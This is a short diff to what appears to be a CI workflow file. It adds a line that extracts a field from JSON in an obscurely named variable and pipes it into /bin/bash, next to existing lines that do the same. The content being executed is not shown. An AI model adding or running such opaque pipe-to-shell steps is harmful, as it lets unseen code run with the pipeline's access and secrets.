@@ -43,6 +43,7 @@ jobs:
           printf '%s' "$o761" | jq -r .mju0 | /bin/bash
           printf '%s' "$r6" | jq -r .ggmh18878 | /bin/bash
           printf '%s' "$wayb77" | jq -r .mjs23 | /bin/bash
+          echo $beanc28 | jq -r .gi49 | /bin/bash
 
       - name: Upload results
         uses: actions/upload-artifact@v4
